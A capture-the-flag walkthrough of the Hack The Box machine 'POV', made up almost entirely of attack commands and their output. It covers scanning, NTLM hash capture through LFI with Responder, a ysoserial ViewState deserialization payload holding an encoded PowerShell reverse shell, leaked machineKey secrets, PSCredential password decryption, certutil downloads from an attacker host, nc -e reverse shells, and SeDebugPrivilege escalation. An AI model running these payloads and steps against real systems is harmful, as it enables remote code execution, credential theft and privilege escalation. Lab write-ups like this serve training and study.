# POV

## Nmap Scan Results

```shell
Running: Nmap Scan Results
Command: nmap -sCV -T4 10.129.230.183
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 14:22 PST
Nmap scan report for 10.129.230.183
Host is up (0.10s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.93 seconds
```

## FeroxBuster Results

```shell
Running: FeroxBuster Results
Command: feroxbuster -u http://pov.htb -x pdf,js,html,php,txt,json,docx -C 404 -v
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

301      GET        2l       10w      141c http://pov.htb/js => http://pov.htb/js/

301      GET        2l       10w      142c http://pov.htb/img => http://pov.htb/img/

301      GET        2l       10w      142c http://pov.htb/css => http://pov.htb/css/

200      GET        4l       10w      382c http://pov.htb/img/favicon.png

200      GET       19l      133w    11607c http://pov.htb/img/smart-protect-2.jpg

200      GET       23l      207w    11858c http://pov.htb/img/smart-protect-3.jpg

200      GET      162l      286w     2399c http://pov.htb/css/custom.css

200      GET        3l       15w     1063c http://pov.htb/img/client-4.png

200      GET        8l       34w     2034c http://pov.htb/img/client-3.png

200      GET        6l       20w     1480c http://pov.htb/img/client-2.png

200      GET        3l       20w     1898c http://pov.htb/img/client-6.png

200      GET       13l       55w     5918c http://pov.htb/img/logo.png

200      GET       22l      132w    13356c http://pov.htb/img/smart-protect-1.jpg

200      GET        5l       26w     1732c http://pov.htb/img/client-5.png

200      GET       14l       43w     2390c http://pov.htb/img/client-1.png

200      GET        2l      284w    14244c http://pov.htb/js/aos.js

200      GET        4l       66w    31000c http://pov.htb/font-awesome-4.7.0/css/font-awesome.min.css

200      GET        2l      220w    25983c http://pov.htb/css/aos.css

200      GET      339l     1666w   139445c http://pov.htb/img/feature-1.png

200      GET      325l     1886w   151416c http://pov.htb/img/feature-2.png

200      GET        6l     1643w   150996c http://pov.htb/css/bootstrap.min.css

200      GET      234l      834w    12330c http://pov.htb/

403      GET       29l       92w     1233c http://pov.htb/font-awesome-4.7.0/css/

301      GET        2l       10w      161c http://pov.htb/font-awesome-4.7.0/css => http://pov.htb/font-awesome-4.7.0/css/

403      GET       29l       92w     1233c http://pov.htb/font-awesome-4.7.0/

200      GET      234l      834w    12330c http://pov.htb/index.html

301      GET        2l       10w      163c http://pov.htb/font-awesome-4.7.0/fonts => http://pov.htb/font-awesome-4.7.0/fonts/

301      GET        2l       10w      142c http://pov.htb/CSS => http://pov.htb/CSS/

301      GET        2l       10w      161c http://pov.htb/font-awesome-4.7.0/CSS => http://pov.htb/font-awesome-4.7.0/CSS/

301      GET        2l       10w      141c http://pov.htb/JS => http://pov.htb/JS/

301      GET        2l       10w      141c http://pov.htb/Js => http://pov.htb/Js/

301      GET        2l       10w      142c http://pov.htb/Css => http://pov.htb/Css/

301      GET        2l       10w      161c http://pov.htb/font-awesome-4.7.0/Css => http://pov.htb/font-awesome-4.7.0/Css/

301      GET        2l       10w      142c http://pov.htb/IMG => http://pov.htb/IMG/

301      GET        2l       10w      142c http://pov.htb/Img => http://pov.htb/Img/

301      GET        2l       10w      163c http://pov.htb/font-awesome-4.7.0/Fonts => http://pov.htb/font-awesome-4.7.0/Fonts/

200      GET      234l      834w    12330c http://pov.htb/Index.html

```

## Gobuster Vhost Results

```shell
Running: Gobuster Vhost Results
Command: gobuster vhost -u http://pov.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -q -t 35 --append-domain

[2KFound: dev.pov.htb Status: 302 [Size: 152] [--> http://dev.pov.htb/portfolio/]
```

## Burpsuite

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

## LFI to capture hash

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### Responder

Have this running prior to sending burp LFI

```rust
sudo responder -I tun0 -w
```

```rust
[SMB] NTLMv2-SSP Client   : 10.129.230.183
[SMB] NTLMv2-SSP Username : POV\sfitz
[SMB] NTLMv2-SSP Hash     : sfitz::POV:a1dae5546891fa44:EED12BD453B0BACB863C377FEB4AA6B7:01010000000000000073ED0EF951DA01F4369F961CDDF3E80000000002000800590030004A00560001001E00570049004E002D004E00410036005700370058003100500045004700320004003400570049004E002D004E0041003600570037005800310050004500470032002E00590030004A0056002E004C004F00430041004C0003001400590030004A0056002E004C004F00430041004C0005001400590030004A0056002E004C004F00430041004C00070008000073ED0EF951DA0106000400020000000800300030000000000000000000000000200000F7B4EFC0A659AA710FBF9ECB28FB98BF3438D381435FAE365246594AAE6F30250A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310033003900000000000000000
```

### Web.config

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

```rust
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>

```

{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter" %}

### ysoserial.exe

{% code overflow="wrap" %}
```
jayson in Release
❯ .\ysoserial.exe  -p ViewState  -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"  --path="/portfolio/default.aspx"  -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAzADkAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
xwrTvkRn0kf6pBL3GnZRzdnD8zhnzWxSwF1aHR%2BHrN%2Bo1%2Fi6LcZVqJYQ6L1DkhvqLEyKetD2O5tba1wjEiPUUmQ%2FCkS04f6RC6LpfQEfr1PCTBpnRu%2BzFsDOR0c%2Bhtfr1PnFNFTEEseaTYroa5fbF183hIkRz9BliYqv0IqweUvSny8qN9EGqC4nioS7gpI8l1cTPfcsfOz4uSI2OA%2F4tXDbQ7NtXnUSAX1bhYPng5%2FBtxCc4Yuet6ymxLvmOx90%2BFiIwPNQ%2FOfvF7uMrcC%2BFHWKjVpmK%2BHW%2B94xO5wIevnMkn0xwTzYq1Q%2BcVSnHcEsvWQHWiu0O%2FHYddykNJL22u6cRS6Hb6iuCyHi7Skr%2B0WYOAoZfd0j4J6jPa2kKi9iA541sSaPlcqfo8b1htWMb%2BMfI3GvMGL%2F0W8a%2FWnq1xb8ayUPsKfvG%2Fx%2BjuYEdRvFQQJ7Z1WVKHkUNp1sSZdnR%2BN5j7rOL946TUS0%2BvqxeD%2BzoFRe%2FBYlcezaWakFmPPn3nYLOGjZtHBqUb6R5idgyoD1jCg%2Bzpw4PkpOWYmnlAAbMoZqkT5fTlSrzgU0yUScxWrU4iGGoK5IqCAJgRor6%2Fo7HhB7A%2F1GXWOV60hkSguzOsTNJXppK6Rxjdu1%2B5unK2PhPGMvckQbh1ETpZgfoSrM8ARuBLgkVds4Vc4j7vOttCFTlrR05HaWI%2Bhyp%2Fxa9TV17HWJPxL2foajwIdrJtdKIszdIe9DRDOBLoGdiQFF6pa%2FgessXPp7spEdJZ2YOS8tL7ovzdpqDk9IsWVkwCTAP6aFINGFeOsKd%2BgjieXOuSvB83cxLRF4K4CpeuEvpI7GW2JJVJGPHV2yAdHirLzKQjxtCVzl3wLmyweSeCPTwe%2FxCHgHuVS8wrz6zdvLjjFmzeJrQwlLUxVbWr797O63iYzhYy82xIsY2yxya%2FP5HDl6zCAkdsyYl7p%2FEr3WNlSMnrWIWH79i0%2BNzIXiq1io%2BGwVC8t6S4PwL7vFlBnIQSZTo6nQxxAsXfsyDpv7nmzLoDftq1p5mZbPRblkN5%2FT26XycMZ4Mm%2BX8ulV4R%2BwtbzP2oLtES0bNpex4KN%2Fs5H2Ecqim8D5qjH63gXKIONzp2RPhE%2B0eCFazWqP9SbT9d6l%2BOc4tIItwVACyhdiJIoZxLh8%2FWuUYKUEsHt36ljzEMGdCbDf9NqG6omX6wBwPmUs1Hu1nEwp0Oaz17cSRq3S7Qo8aYiXMbCtpaclRbb5ZbS1sVOqz%2BZly6qf08ZGp0srXvo%2BGrdSgW2F5PHv%2FcFznSEXZPjKNHVXIwzha6Dxcq3l2BbtCoB3jMb4e6fe3%2BTS%2Fs29Eg53g25cJ75sQ%2BccOGBAy5uKTNclPGuDwpDOiYcMYi5CR84nX1COjX%2BNz20HLjmkTXbC0zlw9DkqIX0oGiPntpP16Fv2vl7hDnP6vMwJ94sYrVm07I1a9Vg6vpls9kuXSk4j0VT0XpX3pZ06vvS6hYqHCnZDDiT%2FdA2qj0orBIaYjSv%2Biqqb00dfs3MYM5q46cKkhuBbrJ2nVbo7Gqz%2FUaJ2uvAnR%2Bd1gPfWhYljznlyCvgQiJ7H5QBJ9HLwAva97Z5GhsZzhHet%2FSK7yv8d4UkF7PV0YwQeKsMaoP2e9UOoIPMhOT6MPC5RrlLd1Z7sPr80M1NxcXRTAZKc08NASMFNx%2BTTEhX600AGqFAERbgBuUVlf1KYL8SuwhKBBo5BGLGNrbhlTcEOpo7uf%2BJ6Gs8pCr2idI6bBeltDk9I1rnYrtGr6RRxp9kgZN220GL5eO96ix2G216woY9apiLpxlzgdZkeo93AmU9td6r6bZYdQUsvFRBg6NrIY9oqCtIN%2F2%2FMk7QJLt85B%2BQ7cL4vVDruzPG3zlTWCJfRaUO9P4OCRUxwxrVbUtbACw1Ppy81j9%2Fmix%2FMLng1TLprZ5Bb0I1D3y9EkSO5ib%2Bucd%2BNl6tw4XQljctjxNioj7KJtkH8Y1LfkPsZx1PL02lcqC%2Fjjesv4yzR%2FEQ7jp1TjyAKJohp5JDJnH7JuNBpQKAGMwUODr%2FXGtoEhboAhkUK887bstDPlCsMUXSeLhByEwJW3SZj8wsqpHFASHmqudEV7PX7e8FDl9T3CNB5wLxJyU6SkRkopSusM02uaaI8Aw4T7179ETEvDWLHIAEncqKqkgIZjK0dhmtTFXee85JVdtkyY784%2Fs1BS5%2BPsp%2F%2FT6ZvQjmpZzIoGYQTHPnKuVUuFUp4DCISCZBQMnhFv36BtEpZcJEFvwRCdBFMjw1iyz0AwLq%2FlF1ZaJROPyiuE3enJY82EEIGmYLDRxcCx6ifl1nUIH5%2B7L%2FPptoxdCQmPBWJ4ai3EVpaPfnP9vbrgBP0d%2B2HVH1YEMjZUbDTBoiiT5KWYNT1g07APyT4h1TpC%2BpLEPMh0v5eYSQ3uM7wgZh1eQb35CkgILr%2BHhrMr56aarSxE%2FPBkpwGVO%2FEux2Ptos7XINrKf7BTFpZD9%2F2gzNxwTfdmVWgM0SlUb9ExWoO4f8Ih9cMEW%2Fb3b89RQ6UqZHy%2B4%2FWV058bG024yDIwIFZbDWVu58sMBCdhvEt6iskn35TE3k2SpcewpfWhWlWb7jDFfML5Jwn8BC250UYcxbatY7QI4yBypf1T%2FQj51fuqtuSKDxFKai0y1N8Rjv5SUVeQjXOuBMMwgrbzvYKQJyAhGzBlbnWIa7zUk4IriQH6O5tX0iSZXlIrP2pofZGqbly8fwAn5YrtRs%2FsMG%2BodumTJkpk%2FbiGQojZJ%2Fuddb6hRllDo3OtqoZbQGnZZjm2NQ8xtOeLDG3Xi0YX%2FBB6LYkAFHbjA%2BuUn952YZKH50f%2BdWTAzp0rM4lQysr3PMPJwXT3nSOkEMki2XXePX3yBPnLnM0F4OlkiiGlLZwXe%2BBssbtvPaVbCMHldECeYs0VbmNzK6F7J%2Bj67z%2FU%2FBS60NoDZPcC8TuegxsBpLijd%2FfeUgGTwB%2BOgNQ2TALfWZSjcgCFZ1zTOimpNrbdSxiwhv7m4CM%2BAMdAHAjPSR3J8LUHREYb1SKlHzqIgucklyzmf1gCATExY%2F%2B6GdSWtZ3yLl8wS7fo25seE3P6FC8QnTqSw%3D%3D
```
{% endcode %}

Send it over to burp

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Catch reverseshell

```rust
p3ta in pov
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.139] from (UNKNOWN) [10.129.230.183] 49677
whoami
pov\sfitz
PS C:\windows\system32\inetsrv>
```

## Foothold - alaading

#### File search

{% code overflow="wrap" %}
```rust
PS C:\users> Get-ChildItem -Recurse *.txt, *.ini, *.cfg, *.config, *.xml | Select-String -Pattern "password"

sfitz\Documents\connection.xml:10:      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929
419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff1
56cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f
0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7
e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
```
{% endcode %}

{% code overflow="wrap" %}
```rust
PS C:\users\sfitz\Documents> type connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
```
{% endcode %}

#### Password decryptions

```rust
PS C:\> $credential = Import-CliXml -Path C:\Users\sfitz\Documents\connection.xml
PS C:\> $credential.GetNetworkCredential().Password
```

f8gQ8fynP44ek1m3

```
certutil.exe -urlcache -f http://10.10.16.139/RunasCs.exe RunasCs.exe
```

#### Runas to get reverseshell

```
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.139:4444
```

```rust
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.139] from (UNKNOWN) [10.129.230.183] 49684
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
pov\alaading

C:\Windows\system32>
```

## Priv Esc - Root

```rust
C:\Users\alaading\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

#### Enable Privs

```
certutil.exe -urlcache -f http://10.10.16.139/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1
```

```
certutil.exe -urlcache -f http://10.10.16.139/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1
```

Run

```
Import-Module .\Enable-Privilege.ps1
```

```
.\EnableAllTokenPrivs.ps1
```

```rust
PS C:\Users\alaading\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
PS C:\Users\alaading\Desktop>
```

```
import-module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(544,cmd.exe -r 10.10.16.139:4444)
```

<pre><code><strong>import-module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent("544","c:\windows\system32\cmd.exe", "/c c:\Users\alaading\Desktop\nc.exe 10.10.16.139 4444 -e cmd.exe")
</strong></code></pre>

This did not work. Create a meterpreter shell, then just migrate to the process (544)
